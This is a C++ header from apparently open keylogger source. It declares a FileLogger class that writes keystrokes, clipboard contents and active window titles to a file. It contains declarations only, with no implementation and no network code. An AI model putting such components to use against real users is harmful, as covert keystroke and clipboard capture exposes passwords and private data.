#ifndef FILELOGGER_H
#define FILELOGGER_H

#include "IClipboardHandler.h"
#include "IKeycodeMapper.h"
#include "ILogger.h"
#include "IWindowHandler.h"

#include <ctime>
#include <fstream>

namespace Keylogger {

class FileLogger : public ILogger {
 public:
    bool open(std::string filename);
    bool open(IKeycodeMapper* mapper, std::string filename);
    bool open(IKeycodeMapper* mapper, IClipboardHandler* clipboardHandler, std::string filename);
    bool open(
        IKeycodeMapper* mapper,
        IClipboardHandler* clipboardHandler,
        IWindowHandler* windowHandler,
        std::string filename
    );
    void close();

    void logKeycode(int keycode, KeyState state);

 private:
    IKeycodeMapper* _mapper = nullptr;
    IClipboardHandler* _clipboard = nullptr;
    IWindowHandler* _window = nullptr;
    std::ofstream _stream;

    bool _modifierCtrl = false;
    bool _modifierShift = false;

    std::time_t _lastKeystroke = 0;
    std::string _lastWindow = "";
};

}

#endif // FILELOGGER_H
